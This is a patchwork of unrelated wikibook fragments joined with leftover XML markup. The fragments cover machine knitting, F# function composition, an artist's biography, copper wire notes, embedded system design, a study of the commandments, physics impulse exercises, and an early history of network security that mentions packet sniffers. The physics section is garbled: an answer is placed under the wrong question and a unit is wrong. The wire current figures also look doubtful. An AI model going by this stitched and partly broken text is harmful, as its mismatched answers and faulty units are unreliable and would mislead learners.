Many pattern knittings must be knitted with comb and side weights, but this makes it more difficult to make the knitting sample fit exactly. However, if you have some practice, you may not always need weights for the knitting sample. On the other hand, this does not prevent you from knitting the work itself with weights, if things proceed easier that way.

==Colour knitting==
[[image:MachineKnitting-Cheetah.jpg|right]]
[[image:MachineKnitting-Dowes.jpg|right]]

If, for example, you knit with colour pattern all over, you may omit weights, and in that case you may knit the sample just like you make a plainly knitted sample, and measure the length along the edge. However, if you want to make a single pattern, e.g. in the middle of the plainly knitted piece, you usually have to use weights. If the pattern makes up only a small part of the whole, you may be guided by a plain sample, but if it makes out the main part, you may simply choose a random pattern for the sample, which you then knit without weights.

One will usually start with a few rows of plain knitting until one begins to make the pattern. But you should not set the row counter until you begin the pattern, and only from then on should the length be measured. Obviously, more stitches go on colour knitting, because the threads on the wrongside draw the knitting together. Therefore, if you make borders of colour knitting alternating with plain knitting, you have to knit the colour pattern with a stitch size larger than that of the plain knitting.

There is a limit to how small a stitch size you may use for colour knitting, because the threads on the wrongside get too long if you knit less than e.g. stitch size 5 - 6. The length of the threads depends on the distance between the needles, and not only on the stitch size. If only a single piece of pattern is involved, you may probably manage just by hanging the longest threads on a needle; this will not be visible on the front side. If there are many long threads, you may crochet them, and attach the last stitch to a needle. You have to begin with a short thread, or even better begin by drawing the first thread in below a stitch, whereby the crocheting becomes fixed in the middle. Only if you use relatively thick yarn as pattern thread will this be slightly visible on the front side.

If you want to knit with three colours in the same row, then you must, instead of the colour button, use the idling buttons. It is most practical to have all three colours in the same side, knit them one at a time, returning empty and fetching the next colour, until you have all colours on the other side. I.e., you have to make the card in such a way that you leave out a row in those turns when you return empty. When you start on a new row, you will not have to leave out a row, because now all colours are on the same side. Of course, the more colours you use in the knitting, the longer threads you get on the wrongside. I will not recommend knitting with more than three colours; the machine is not so &quot;happy&quot; with it. At least, mine is not.

==Imitated jacquard==
[[image:MachineKnitting-Top.jpg|right]]
If you knit with yarn that is too thin for colour knitting, you have another option, which I call &quot;imitated jacquard&quot;. Thereby I mean a type of patterns that consist of two rows of pattern alternating with two rows of base colour. For every colour, a few stitches are detached loose. On the machine, this is done by using the idle position, i.e. those stitches that are not to be knitted, remain in knitting position, and those that are to be knitted, are set in idle position. Those stitches that are not knitted will extend into the next colour and form the vertical lines in the pattern. There may never be several stitches next to each other out of function, just as there may never be more than two rows with each combination of needles. The dots indicate which needles are not to be knitted. These are every other round in a pattern row and every other round in a base colour row. The pattern may not go in an oblique direction, because then the needles would have to be out of function twice in succession.

Evidently, these patterns become fairly compact, and therefore they are best fit for borders. A typical example is the classical Greek meander borders, but once you have understood the principle, you can make many other patterns yourself.

[[image:MachineKnittingFig8-1.gif|frame|left|Fig. 1]]
[[image:MachineKnittingFig8-2.gif|frame|right|Fig. 2]]
[[image:MachineKnittingFig8-3.gif|frame|right|Fig. 3]]
Here you see some examples of imitated jacquard: Figure 1 shows how to draw the pattern. Begin with the lowest row that is a pattern row. Here, the white squares with dots are to be set out of function. Knit two rows. After that, two rows of base colour are knitted, and here the dark squares with dots are set out of function, etc. If the pattern is to begin with a row of base colour, you must start with a stripe of the pattern colour.

Figure 2 shows another pattern as it looks when knitted. Here you see that if you want more than one stitch in between, you may manage that by making dots; thereby the pattern becomes less compact.

Figure 3 shows on top the pattern, below that how to make your card if you can knit a negative and twice as high, and at the bottom how to make the pattern if you cannot. The black ones are pattern rows, the red ones are base colour rows, the white ones are the needles that remain in knitting position, and thus are out of function.

These patterns take approximately twice as many rows as stitches, but as you knit two rows with each colour, the patterns become approximately equally large in each direction.

If you want to make patterns yourself, then draw on a sheet of chequered paper, and try to place dots like in the figure. Then you will see if it is feasible.&lt;br style=&quot;clear:both&quot; /&gt;

==Lace knitting==
In lace knitting, the garment will be looser than in plain knitting. How loose it gets, depends of course on how close the eyelets are positioned. If there are only few eyelets, you can use a plain knitted sample as guide. If you have a lace carriage, you will always have the lace carriage to the left and the ordinary carriage to the right, unless the lace carriage is built in. Therefore you have to knit at least two rows between every row with eyelets. If you do that, and assuming that the eyelets are evenly distributed, the following rule applies: If the stitches have been shifted only one step, the pattern has to be knitted one number lower than in plain knitting. If the stitches have been moved by several steps, thereby producing a structural pattern, you can use the same stitch size as in the plain knitted sample. If you knit eyelet patterns alternating with plain knitting, you must reduce the stitch size by one number every time you are doing eyelet knitting (unless you have shifted the stitches by several steps), and go back to the original size when you return to plain knitting. Thus, in lace knitting you may manage with just a plain knitted sample.

==Tucking pattern==
Tuck is a structural pattern that appears on the wrongside. You can make tuck knitting by putting those needles in idling position that are to be &quot;tucked&quot;; thereby, the threads settle over them, and when you activate the needles again, these threads are fixed by the next row. There must not be several tucked threads next to each other.

Tuck may also be produced with the tuck buttons. This looks nicer, because if you put the needles in idling position, the knitting stretches a little. When the machine is set for raised ribbing, only those needles are being knitted that are in idle position, and the thread will settle over those needles that are in knitting position (On a ROYAL you cannot see which needles are involved. There, you set for raised ribbing, and then the punch card takes care of the pattern). You may knit two or several rows with every needle combination. For example, you may knit honeycomb pattern by knitting every fourth stitch as rib, go on to knit 4 - 5 rows, and then shift by two stitches and knit 4 - 5 rows. For such patterns, most machines will probably require a comb with side weights. However, with a small knitting sample you may manage without weights. In that case the sample fits more easily, and you make it in the same way as a plain knitted sample. The sample should be smoothed out in transverse direction, however, but without making it tighten. If you have been using weights, the edge cannot be utilized for the length measurement, but one may hold the sample a bit together lengthwise, if only not so much that it makes folds. There is no problem in knitting the work itself with weights, even if no weights were used for the knitting sample.

It is possible to make some beautiful lace patterns e.g. by knitting on every other needle, and then tuck the threads on every fourth or every sixth needle. These may be shifted relative to each other. There are many possibilities.

===Cables===
May be made on a single bed machine as follows: Instead of having a purl stitch on each side of the cable to set the cable off, you may leave out a stitch and put the needle in starting position, so that a hemstitch appears.

==Weave patterns==
[[image:MachineKnitting-8-weave.gif|right]]
Weave patterns appear on the wrongside. You can only make them if you have weave brushes, either built into the machine, or loose, as extra equipment that may be put on.

Knit the base with thinner yarn. The weave yarn is placed by hand and led by a notch at the side of the carriage. It must be thicker than that below, and may even be thicker than what can usually be applied on the machine. Thus, you actually knit with two different thickness of yarn. The weave thread will become fixed in those places where there is a shift between those needles that are up, respectively down, i.e. in knitting position and idling position. The thread may just as well pass over needles that are up as needles that are down. It is the shifting between them that causes the fixation.

There are many possibilities for weave knitting. If, for example, you want a regular pattern effect, you may change between a base where every other needle is put in idle position alternating with having the opposite every other needles in idle position (&quot;salt and pepper&quot;), and a pattern where you extend over several needles. Such patterns have to be relatively simple.

Knitting samples for weave knitting may be used at once. The weave threads fix the knitting. Weave knitting has the property that you may cut in it. The stitches will not run further than to the first place where the weave thread has been fixed.

==Intarsia knitting==
[[image:MachineKnitting-8-West.jpg|right]]
Intarsia knitting is made with an intarsia carriage which is extra equipment. It knits with the needles standing in idling position. Thereby, you can place the thread by hand, allowing you to place different colours into the same row and then wind the threads around each other where they meet. You may make intarsia knitting with only two colours that separate either medially or at a slant, or whatever you want. You may also make squares of different colours, equally sized or in different sizes, or other shapes.

If you have many colours, it may soon become a mess, unless you do as follows: You must constantly take care that the yarn on the outward way is twisted one way around, and on the homeward way twisted the opposite way around. If you use only little of every colour, you may make small figure 8-shaped balls of yarn, where the thread is pulled from the inside. These balls are made by winding some yarn around your hand, keeping the beginning of the thread free, and finishing it off by winding a little yarn around the middle of the ball. The balls should not be so loose that they fall to the floor, but they do have to hang somewhat down. On the other hand, the thread must not be so tight that it is tedious to pull it out. If you need slightly bigger balls of yarn, you may put each of them in its own little plastic bag fixed with a clothes peg that keeps the thread as tight as is suitable. Here, too, the thread should be pulled from the inside of the ball.

If you have a knit leader, you can knit pictures. The pictures are drawn on the dress pattern on the sheet, so it can be read where the colours change.

If you have a plating yarn feeder, this too may be used for intarsia knitting, because you can see the needles, so you can change thread in the right place; but unfortunately, you cannot at the same time knit a colour pattern. The plating yarn feeder is meant for adding an extra thread, e.g. a thin gold or silver thread, which is knitted together with the thread proper, and which is seen either on the wrong- or the rightside, depending on whether you put it in front or behind.

==Garter patterns==
If you have a garter carriage, you can make wrong/rightside patterns coded by punch cards. It is possible to make these patterns without comb and weights, at least on BROTHER. The sample is made in the same way as a plain knitted sample. The garter carriage knits by itself, but on the other hand it works very slowly. I would guess that a hand knitter might knit almost as fast. The advantage is that you do not have to sit next to it. But if the stitch number has to be decreased or increased, you must take care to be there in time, otherwise it will last several days to knit one piece. If you want to shut off the machine, e.g. during the night, you may risk that the pattern has become displaced when you turn on again. Therefore, you should always, if possible, encode the pattern so that it stays in right place.

==Patterns with the ribber==
In addition to knitting various versions of rib, 1/1, 2/2 etc., you may rack stitches or rib stitches. If on the ribber you leave out a needle e.g. in two positions near the middle, so that there are two empty needles instead of one, you may rack the stitches between these two needles, but not in the rest of the piece. If you do it in the opposite way, the racked stitches will appear on the sides but not in the middle. In this way, you may produce either stripes or check patterns by alternating between having racked stitches in one side and the other side.

You may also do raised ribbing on the knitter guided by a card, and ordinary rib on the ribber. In this way, something appears which resembles a lace pattern. The pattern must be made on all needles (full rib), unless the machine has a button that can make the pattern twice as broad, which is the case with certain machines.

===Jacquard===
In addition to these patterns, some of the newer machines allow you to make multi-colour-rib (jacquard). This requires a colour changer, which is available with four colours and a yarn feeder dimensioned for four colours. The pattern is knitted with two rows of pattern alternating with two rows of base. You begin with one row of base. Thereby, the rows become staggered so that the alternation is less visible. Some machines have a button that automatically changes the pattern on the card for jacquard. On the other hand, if you have to make the patterns yourself, it becomes very tedious, but it is feasible. After all, when you buy the equipment, it includes pattern cards meant for jacquard. The advantage of jacquard is that you avoid threads on the wrongside, which would especially be bothering if you knit large patterns or large single motives. The spaces will instead by knitted on the ribber.

There are three ways to make the patterns:
# On all needles
# With every third needle on the ribber and all needles on the knitter
# On every second needle

[[image:MachineKnitting-Jacquard1.jpg|right]]
'''Method 1''' is most feasible if the ribber has a button that can be set so that every other needle is taken when going outward and the opposite every other needles are taken when going homeward. Here you must look out if you increase or decrease in one side, because then the system is messed up, the same needles being taken every time. You can avoid this by pushing up needle number 2, because the machine will always begin with that one. But if you have the same needle number in both sides, this does not happen. If you increase or decrease in both sides, you must use both threads in the side where the colour changes, otherwise the machine will lose stitches when it changes colour. &lt;br style=&quot;clear:both&quot; /&gt;

[[image:MachineKnitting-Jacquard2a.jpg|left]]
[[image:MachineKnitting-Jacquard2b.jpg|right]]
'''Method 2:''' Method 1 produces a relatively thick garment. But it is sufficient to include every third needle on the ribber. In this case you have to shift by one half stitch, placing the needles between each other. On the knitter, there will be 3 needles in between. This requires a little more stitches on the knitter than in plain knitting, because the purl stitches draw the whole a little together. &lt;br style=&quot;clear:both&quot; /&gt;

[[image:MachineKnitting-Jacquard3a.jpg|right]]
'''Method 3:''' Rib on every other needle. This method requires a button that makes the pattern twice as broad, unless you make special patterns that only use every other needle.

With this kind of knitting you may, for example, knit a name into the rib border on stockings. You have to make the letters both upside down and mirror imaged. If, on the other hand, you have a machine that can knit downwards from above, the letters shall not be made as their mirror image, as they become so when they are turned upside down. Remember that stockings are knitted downwards from above. If you have a punch card covering 24 stitches, there will only be room for the initials. Only if you have a print card or a diskette, you will have room for the whole name. If you have cast on 60 stitches for stockings, there will be room for a name with 5 letters, or, if one of them is i or j, it can be 6 letters.

For jacquard, the stitches have to be 1 to 2 numbers lower on the ribber than on the knitter. With large stitches, it will be 2 numbers, and with smaller stitches 1, for the very smallest maybe only 1/3.

Most machines require weights for all rib patterns. Therefore, you have to make the knitting sample in another way. Cast on e.g. 60 stitches and hang only a few of the small weights on the middle. The sample has to lie for at least two days, and preferably several days.

Length as well as breadth have to be measured along the midline. Only in raised ribbing, the breadth must be measured a few cm under the contrast colour yarn, which must likewise be knitted with raised ribbing. Knit e.g. 10 rows of contrast colour yarn, corresponding to 5 rows of ordinary knitting, and cast off the stitches without closing. If you knit with very fine yarn, e.g. on stitch size one, it is necessary to have a little weight in each side. Therefore, this too has to lie for several days. &lt;br style=&quot;clear:both&quot; /&gt;

      <text xml:space="preserve">=Problems with the knitting=
When you buy a knitting machine, you are usually told that it will run easily, i.e. that you do not need to use force. This is actually true, provided that there are no problems with the yarn, that it is not too thick, and not uneven. Of course, if a knitting machine is demonstrated to you, the shop will use problem-free yarn. But in practice, you will probably use yarn of many different types. As referred to above, it helps a lot to wax the yarn with a stump of a stearin candle. Some machines have a little peg meant for a bit of wax along which the yarn can slide. Personally, however, I do not think that this helps sufficiently. When you wind the yarn on a yarn ball winder, you may simultaneously let it slide over a stump of stearin candle.

A carriage should be moved like you move an iron. You press a little on the hind end, depending on how easily the yarn runs. It is a good idea to hold both hands on the carriage; it is hard to your arms if you use only one hand. It is also important that you sit at the right level. If the chair is too low, you put a strain on your shoulders, and if it is too high, you put a strain on your back. For some machines, a motor is available, but that is an expensive investment, and the knitting does not run faster, far from it. The only advantage with the motor is that it spares your arms.

If you get problems with the carriage getting stuck, you will first have to control if there are knots or mess in the yarn, causing it to tighten, or if a needle should have become trapped. If these things are not the cause, you must try carefully to winkle. Different machines each require their own way to be winkled. You will gradually learn this, when you become acquainted with your machine. In some machines, the carriage has to be pressed somewhat harder down towards the needle bed, some have to be winkled a little out and in on the bar, but always with care. With a machine that does not use weights, you may pull down the knitting. However, if none of these attempts help, there is no other way than taking off the carriage. Maybe there is some mess under the carriage; maybe a needle has been trapped after all, which you just could not see because of the carriage. If you use force, you may bend or break needles. A number of spare needles are always included when you buy a new machine; but if the needle is not too badly damaged, you may yourself try to straighten it out carefully with flat-nose pliers, the needle being fixed in a vice. Also, the latch may have become wry. This can usually be corrected with the pliers, but if you are too violent, there is a risk of breaking it. However, you have to be aware that needles that you have straightened out yourself, may in certain cases cause problems; but it is nice to be able to cope with the situation at a pinch.

If the machine has been standing out of use for a long time, you could oil the moving parts under the carriage, the bar on which the carriage slides, and the needle feet. You do not need to do this very often. A knitting machine is easily kept up; you just need a little brush to cleanse off dust. But in case there are problems with the machine, it may sometimes help to oil it. If you have bought a second-hand machine, you may cleanse it thoroughly, by taking off all needles and putting them in kerosene.

I have experienced that my machine could not be used together with the ribber, it blocked in several places. It turned out that the needles were sitting too high; they have to lie flat down on the machine. The cause was that the needle holding bar was worn, i.e. the rubber below it was worn down, and therefore it did not press down the needles sufficiently. So, the needle holding bar had to be changed, and the needle bar to be cleansed. By the way, this machine had been bought second-hand; it had been used for demonstrations.

You may often have the problem that some loops get stuck in the gate pegs; and after you have knitted a few rows, the casting-off system does not function with the needles that are nearest to them. This may especially happen if you have unpicked, or carried out something manually with the knitting. What happens is that the thread between the stitches gets inside the gate, and then it remains there. Therefore, it is important to look carefully, after having unpicked, that all loops go outside the gate. There must never be anything inside. But that may be hard to see. Once you have begun, it may go on to be tricky. The cause is that, once you lift off some loops from the gate, new loops will easily get in instead. You can avoid that as follows: After having felt with your hand behind the knitting and discovered where something is wrong, you have to put several of the needles around that place in resting position, which allows you to lift off the loops with the crochet hook, or to nudge them up with a finger, without causing anything to happen with the rest.

If you are knitting with two or several threads of machine yarn, you may get the problem that now and then the machine takes only one of the threads. This, too, may easily cause some loops to get stuck in the gate pegs. The cause may be that the machine needs oiling. It may also be that you are knitting to loosely. Sometimes it is sufficient just to reduce the stitch size by 1/3 number; that will not be visible in the knitting, or make any greater difference in the knitting sample. For safety's sake, you may knit a few additional rows.

If you knit with several threads of machine yarn in different colours, it may give an interesting effect. If you simply take the threads directly from the cone, the knitting will come in random stripes, varying according to how the yarn lies. Sometimes, one colour is at the bottom, sometimes another. But if it occurs that you unpick and wind the yarn jointly, it will become twisted, and the knitting will become speckled instead of striped. If you have wound the yarn before you knit and afterwards have to unpick, it will be wound in another way, it becomes twisted an extra turn, and the specks will look differently. So, you have to wind the threads separately.

If you have some remnants of yarn, or somebody has given it to you, and you do not know if it is wool or artificial material, you may carry out a burning test. You place a small bit of yarn in an ashtray and add a lighted match. If the yarn melts into a small clump or ball, it is synthetic; but if the ash keeps its shape and smells of burnt hair, it is wool. If it is a mixture, some of it will behave like wool, and some will melt. This may be hard to see, however, if there is only little wool in it. There are many different mixtures.

Cotton is recognized by making a thread wet; thereby, it will become stronger. You may first try to break it when it is dry, and afterwards make it wet. But cotton, too, may be mixed. Then, it will still be stronger when it is wet. But you may also try to carry out a burning test. The synthetic part will make it shrink, but there will still remain a thread. It smells quite differently from wool, rather like burnt straw, but cotton too keeps its shape.

      <text xml:space="preserve">F# already has function composition operators &gt;&gt; (f of g) and &lt;&lt; (g of f). Also function composition should be preferred over pipe-lining in general. There should be more emphasize on function composition because one can *compose* functions and pass them around, pass them to higher-order functions without the need of writing explicit lambda expressions. Function composition is also important for writing point-free style programming.</text>

      <text xml:space="preserve">&lt;big&gt;&lt;big&gt;'''BIO'''&lt;/big&gt;&lt;/big&gt;

Clay McGlamory was born in San Diego, California on May 28th, 1970.  In 1978 he and his family moved to Okinawa, Japan where they traveled extensively throughout Asia before moving to the Tidewater area of Virginia.  His experiences in the South Pacific and Asia changed his outlook at an early impressionable age, enriching his appreciation for other cultures as well as his own.  He went to 6th through 12th grade in Virginia Beach where his interest for visual art began to thrive.  Clay moved to Norfolk where he went to Old Dominion University (ODU) for his BFA and attended the joint program between ODU and Norfolk State University for his MFA graduating with honors.  He has taught printmaking and design courses for ODU as an Adjunct Assistant Professor since 1999 and has taught printmaking and book arts for the Governor’s School for the Arts since 1994.  Clay has had 15 solo exhibitions including The Red Door Gallery in Richmond, Virginia in 2009, The White Canvas Gallery in Richmond, Virginia in 2006 and The Contemporary Art Center of Virginia in Virginia Beach, Virginia in 2005.  His work has been included in over 120 national and international juried and invitational exhibitions and has won awards for printmaking, book and mixed media works.  He was one of the 2007 recipients of the SURDNA foundation grant for artists teaching in art specialty high school programs.  Clay is an active, participating member of the Southern Graphics Council and the American Print Alliance.  He has given workshops in a variety of media, worked as a master printer, completed commissioned site specific installations, curated exhibitions and organized print portfolios that have been exhibited in many venues across the country and are in national collections.  The majority of Clay’s current works are large back lighted screenprint installations and monoprints on colored and clear Acrylic sheets, he also works in lithography, collograph, book arts, and creates mixed media assemblages.  His work is in numerous public and private collections, including a recently installed, 18 foot long, back lighted, permanent commission work in the Batten Arts and Letters Building on the campus of ODU.




&lt;big&gt;&lt;big&gt;'''ARTIST STATEMENT'''&lt;/big&gt;&lt;/big&gt;

My recent work involves creating optically charged images on clear and colored sheets of acrylic.  These works are a continuation of my exploration into the formal qualities of color, light, shape, and pattern, which I have been building upon in my work since the early 1990's. Many of the mixed media installation works in this series are multi-layered and lighted from behind, further pushing the optical and hypnotic qualities of these works by highlighting the incredible depth and luminosity inherent in these pieces.  My ideas for creating these works came from my interest in Op art and my experimentation with the properties of kaleidoscopes, tessellations and repetition of patterned imagery.  I start out by examining photographs I have taken until I find the right image or image fragment.  Then I manipulate the images &lt;big&gt;big&lt;/big&gt;in the computer and create positive films and transferable imagery.  Next I screenprint, paint and transfer the images in a variety of vivid colors and orientations on multiple panels.  Finally I collage these individual units together on the walls to make interchangeable kaleidoscopic grids and installations.  My intention is to use repetition of form, vibrant color and aesthetic distance in the large grids and installations so the works become hypnotic and entrancing. My goal in these works is to be visually intriguing and to figuratively assault the viewers’ optic nerves.

# All values are rounded to three significant figures. Values less than 1×10&lt;sup&gt;−6&lt;/sup&gt; are shown with appropriate SI prefixes to avoid a large number of leading zeros.
# The [[:w:IACS|IACS]] value of 58.0 MS/m is used as the conductivity of copper.
# These calculations do ''not'' take into account AC effects such as the [[:w:skin effect|skin effect]] - perform suitable calculations before using in a high-frequency application. Grid mains frequencies (50-60 Hz) should not have a noticeable effect, as the skin depth is over 8mm.
# A density of copper of 8920 kg/m&lt;sup&gt;3&lt;/sup&gt; is used to derive the mass
# An allowance of 750 kcmil/A is generally sufficient for calculating current capacity. The more relaxed 500 kcmil/A is an absolute maximum.
# The values are guidelines − exact values will depend on the type of wire and operating conditions such as ambient temperature, thermal conductivity of the surroundings.

With increasing complexity of embedded systems, there is a need to explicitly control the interaction process instead of implicit definition of the interaction embedded in the different subsystems itself.

To explicitly control the interaction process on a software level, the interaction process is split in different parts, where each part can be handled at a different moment in the design process. These parts are known as the four fundamental &quot;concerns&quot; of system design: communication, computation, configuration and coordination&lt;ref&gt; Coordination in Evolving Systems - By Radestock M. and Eisenbach S.&lt;/ref&gt;.

* The &lt;u&gt;communication&lt;/u&gt; part defines how agents communicate with each other.

* The &lt;u&gt;computation&lt;/u&gt; part defines the implementation of the behavior of individual agents. It thus determines what is communicated.

* The &lt;u&gt;configuration&lt;/u&gt; part defines the interaction structure, or configuration. It states which agents exist in the system and which agents can communicate with each other, as well as the method of communication. It is a description of where information comes from and where it is sent to.

* The &lt;u&gt;coordination&lt;/u&gt; part defines patterns of interaction, i.e. it determines when certain communications take place.

An example of the four fundamental &quot;concerns&quot; of system design can be found in the [[Embedded_Control_Systems_Design/Automotive#4C.E2.80.99s_of_distributed_systems | automotive application section of this wikibook]].

      <text xml:space="preserve">===HONORING YAHWEH GOD===
Yeshua summed up the whole law in one verse:
&quot;You shalt love the Lord your God with all your heart, and with all your soul, and with all your strength, and with all your mind; and your neighbor as yourself.&quot; Luke 10:27 

Speaking again to the Pharisees, He confirmed that this is the greatest commandment in the law,  saying, &quot;This is the first and great commandment. And the second is like it: You shall love your neighbor as yourself. On these two commandments hang all the law and Prophets.&quot;  Matthew 22:34-40 (verses38-40)

This is the sum total of all the other laws, precepts, statutes and commandments.  How awesome!

Everything is contained in these two principles:
1. Love Yahweh God with every part of your being, and
2. Love your neighbor as yourself.

This is the basis for inheriting eternal life and the sum total of what is required to honor Him in our lives.
To love Him without measure  -  with all one's heart, all one's mind and with all one's strength. 
And then, to love one's neighbor as oneself.

If loving Him is the sum total of the Law, then it is a love measured by keeping His commands and not by our emotions toward Him. To love Him with all our heart does convey that our affections are toward Him and that He is the pre-eminent love of our life, that we put Him and His principles first in everything.

To love Him with all of our mind, means that our thoughts, our intentions and our purposes are directed to be  in agreement with His Word which will have its outworking in us loving Him with all of our strength in what we do, so that all of our actions are set to glorify Him, and not to please ourselves.

To execute this in our lives we must understand what is required of us, how these basic principles are applied in situations, and therefore how we are to live.  It is not so difficult to know how to love our neighbor as ourselves, if we apply the &quot;do unto others as you would have them do to you&quot; principle.  But how do we expand the basic principle of loving Yahweh God with all of our being?  We must go to the scriptures.

====THE LAYERED APPLICATION====
Having understood the basic principle which in essence, starts with our own attitude and mind-set, we then go to the next layer in the ten commands which give the first practical level of applying the basic principles. The first four commands have to do with our worship of Yahweh God and the other six, with our service to our fellow man. Then the greater expansion from that is in the rest of the scriptures.

=====The Commands Toward God=====
 The First command
&quot;I am Yahweh your God, who brought you out of the land of Egypt, out of the house of bondage. &quot;You shall have no other gods before Me&quot;   Exodus 20: 2-3

This is calling us to acknowledge Him as the Supreme being, God of all, our Redeemer and our Deliverer.
He alone is to have first place in our lives and nothing else is to be allowed to contend for that position.


 The Second command
&quot;You shall not make yourself a carved image - any likeness of anything that is in heaven above, or that is in earth beneath, or that is in the water under the earth; you shall not bow down to them nor serve them. For I, Yahweh your God, am a jealous God, visiting the iniquity of the fathers upon the children to the third and fourth generation of those who hate Me, but showing mercy to thousands, to those who love Me and keep My commandments.&quot;  Exodus 20: 4-7

We are not to place a representation of anything before our eyes which will cause us to come into servitude to it
Any and every thing which we allow to have dominion over us will have its repercussions upon our descendants through the bondage to the elemental forces of this world which are controlled by Satan.  Whereas His mercy is extended to those who Fear Him and keep His commandments.


 The Third command
&quot;You shall not take the Name of Yahweh your God in vain, for Yahweh will not hold him guiltless who takes His Name in vain.  Exodus 20: 7

Taking His Name in vain, or dishonoring His Name has many applications, from using it to make a vain oath to not using it at all,  which is by default, ignoring His name.  It is an insult to not use His Name, Yahweh.


 The Fourth command
&quot;Remember the Sabbath day, to keep it holy. Six days you shall labor and do all your work, but the seventh day is the Sabbath of Yahweh your God. In it you shall do no work: you, nor your son, nor your daughter, nor your male servant, nor your female servant, nor your cattle, nor your stranger within your gates. For in six days Yahweh made the heavens and the earth, the sea, and all that is in them , and rested the seventh day. Therefore Yahweh blessed the seventh day and hallowed it.&quot;  Exodus 20: 8-11

Keeping the seventh day, the Sabbath, is one of the four practical ways in which we honor Yahweh God. It is a day to be kept set aside from the issues of our livelihood and from the affairs of this life. A day reserved for Him for the whole of our household to rest and be spiritually and physically refreshed.

=====The Commands Toward Man=====
Our obedience to the rest of the commands will be determined by how much we honor Him personally. So, in the keeping of these first four, the relationship which we have with Him will be reflected in our actions with our neighbor. In reverencing Him above all, we will reverence those made in His image also.

&quot;God is love, and he who abides in love abides in God, and God in him.&quot;  1 John 4:16b

In reverse, lack of love for our neighbor is a reflection of the fact that we do not really love God. In other words, we are not really keeping those commands which pertain to honoring Him in our lives. 

As John says,
&quot;Beloved, let us love one another, for love is of God; and every one who loves is born of God and knows God. He who does not love does not know God, for God is love.&quot;   1 John 4: 7

&quot;If someone says,'I love God,' and hates his brother, he is a liar; for he who does not love his brother whom he has seen, how can he love God whom he has not seen?  And this commandment we have from Him: that he who loves God should love his brother also.&quot;  1 John 4:20-21

We have the commandment to love our brother out of our love for God.
Quite often the hindrance to being able to love our fellow-man is in the breakdown of the first two commands. We do not love God with all of our being and/or we have something or someone else that is occupying the seat of our affections. That person may be &quot;Self&quot; in first place, which is idolatry of ourselves.  In which case, we need to repent and seek His forgiveness.

The rest of the commands toward our fellow-man come in the order of their importance:

No. 5 - Honoring our parents as the source and providers of life and sustenance  -  Mark 10:19

No. 6 - Murder in its origin in the heart as hatred onto the final act  -  Matthew 5:21-26

No. 7 - Adultery in all forms back to its origin in lustful desires  -  Matthew 5:27-32

No. 8 - Stealing in all forms of taking what is not rightfully yours to take  -  Matthew 5:38-42

No. 9 - Swearing falsely against the known truth  -  Matthew 5:33-37

No.10 - Covetousness to possess what belongs to another  -  Matthew 6:19-34
	

This forms the framework of Yahweh God's holy laws, built upon the basic principles which Yeshua gave us, which are fleshed out in detail in the rest of the scriptures.

      <text xml:space="preserve">You should already know that the force exerted on an object is proportional to its acceleration. The constant of proportionality is known as the mass of the object:

&lt;math&gt;F = ma&lt;/math&gt;

In the case of a collision, for one of the particles in the collision, the acceleration is simply the difference between its velocity before the collision (u) and its velocity after the collision (v) per unit. time:

&lt;math&gt;F = \frac{m(v - u)}{\Delta t} = \frac{mv - mu}{\Delta t}&lt;/math&gt;

So, force is the rate of change of momentum. The quantity on top is known as the impulse of the collision, measured in Ns; &amp;Delta; t is the length of time it took for the collision to take place. So, the impulse I is given by:

&lt;math&gt;I = \Delta p = mv - mu = F\Delta t&lt;/math&gt;

In a collision where a certain change in momentum (impulse) occurs, a force is exerted. If the collision time is small, a larger force is exerted. If the collision time is long, a smaller force is exerted. If you have a graph of force against time, impulse is the area under the graph, since:

&lt;math&gt;I = \int{F\; dt}&lt;/math&gt;

The impulse on one particle in a simple collision is the negative impulse on the other particle.

==Questions==

1. Escape velocity from the Earth is 11.2km&lt;sup&gt;-1&lt;/sup&gt;. How much impulse must be exerted on a 47000kg payload to get it to travel away from the Earth?

2. Two billiard balls, of mass 10g, collide. One is moving at 5ms&lt;sup&gt;-1&lt;/sup&gt;, and the other at 2ms&lt;sup&gt;-1&lt;/sup&gt;. After the collision, the first billiard ball is moving backwards at 4ms&lt;sup&gt;-1&lt;/sup&gt;. The collision takes 1 ms. What force was exerted on this ball?

3. What impulse and force were exerted on the second ball?

4. A 60kg spacewalker uses a jet of gas to exert an impulse of 10Ns. How many times would he have to do this to reach a speed of 1 ms&lt;sup&gt;-1&lt;/sup&gt; from stationary?

5. A 5kg bowling ball collides with a stationary tennis ball of mass 0.1kg at 3ms&lt;sup&gt;-1&lt;/sup&gt;, slowing to 2.5ms&lt;sup&gt;-1&lt;/sup&gt;. It exerts a force of 100N on the ball. How long did the collision take?

&lt;math&gt;I = m(v - u) = 47000(11200 - 0) = 526.4\mbox{ MNs}&lt;/math&gt;

'''2. Two billiard balls, of mass 10g, collide. One is moving at 5ms&lt;sup&gt;-1&lt;/sup&gt;, and the other at 2ms&lt;sup&gt;-1&lt;/sup&gt;.

&lt;math&gt;F = \frac{m(v - u)}{\Delta t}&lt;/math&gt;

&lt;math&gt;\Delta t = \frac{m(v - u)}{F} = \frac{5(3 - 2.5)}{100} = 0.025\mbox{ s}&lt;/math&gt;

      <text xml:space="preserve">== Network Distribution ==

When networking first started, connections between computers were simple one directional links. Then Two directional links were developed. Then banks of connections became possible, and so on. Today literally millions of computers are connected to every computer in the internet. At each expansion of networking to a large audience, the problems caused by connectivity increased.

At first it was enough to have access control to the computer room. then as computers began to connect, it was found that service companies were building illicit links into the computer rooms in order to deal with service requirements without visiting the site. These Back door links were at first thought to be a good idea, but later found to be a security problem. The development of War Dialing made an extra phone line into the computer a security breach.

=== Trusted Computers ===

At first networks were in-house, you could, it was thought trust the computers in your own computer room, because you had access control. But about this time time-sharing began to happen, and terminals spread outside the computer room in large banks. Some of these terminals had system user capabilities and thus could be used to attack data integrity from outside the confines of the computer room. Later, computers became even more prevalent, and everyone seemed to have one. The idea of Local area Networks was created, in order to allow people to hook up their own systems within an office or home.

Then internetworking began to happen, one network hooked up to another network, and so on. It became possible for disgruntled employees to reach beyond their local network, and play havoc with networks on the other side of the building. Then internetworking took off, and the Internet was created and it became possible for people half the world away to affect your private computer. Obviously you needed some control over who was allowed into your computer.

=== Hubs and Packet Sniffers ===

Along with networking came the idea of a hub, where multiple computers were hooked up to the same network segment. It was found that if a network card was put in promiscuous mode it could listen in to all the data flowing through its own network segment. All that was needed was a packet sniffer, and you could literally read the data right off the network.

=== Switches and Routers ===

